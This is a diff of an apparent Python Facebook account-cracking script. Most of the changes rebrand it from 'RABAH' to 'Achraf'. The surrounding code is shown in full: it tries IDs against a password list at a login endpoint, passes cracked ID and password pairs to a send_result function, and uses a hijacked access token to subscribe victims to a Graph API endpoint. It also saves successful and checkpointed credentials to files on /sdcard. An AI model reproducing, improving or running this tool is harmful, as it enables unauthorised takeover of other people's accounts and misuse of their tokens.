@@ -411,7 +411,7 @@ logo=(f"""\033[1;32m
 # I love you Mom 
 def linex():
     print('\033[1;35m─────────────────────────────────────────────')
-os.system('xdg-open https://www.facebook.com/achraf.Chawi.05')
+os.system('xdg-open https://www.facebook.com/Rabah.Chawi.05')
 # I love you Mom 
 def dino():
     print('\033[1;35m─────────────────────────────────────────────')
@@ -607,7 +607,7 @@ def menu():
 def M_file_1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [RABAH-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                 
+                        sys.stdout.write('\r\r\033[1;37m [Achraf-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                 
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -637,21 +637,21 @@ def M_file_1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;92m [RABAH-OK] ' + ids + ' √ ' + pas + '\033[1;97m')
+                                        print('\r\r\033[1;92m [Achraf-OK] ' + ids + ' √ ' + pas + '\033[1;97m')
                                 #        print(f"\033[1;33m»» JOINED: {asha(ids)}\033[0m")
                                         send_result("OK", ids, pas)
                                         linex()
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '8377547/' + 'subscribers' + '?access_token=' + token)
-                                        open('/sdcard/RABAH_OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Achraf_OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;91m [RABAH-CP] ' + ids + ' × ' + pas + '\033[1;97m')
+                                                print('\r\r\033[1;91m [Achraf-CP] ' + ids + ' × ' + pas + '\033[1;97m')
                                                 send_result("CP", ids, pas)
                                                 linex()
-                                                open('/sdcard/RABAH-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Achraf-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
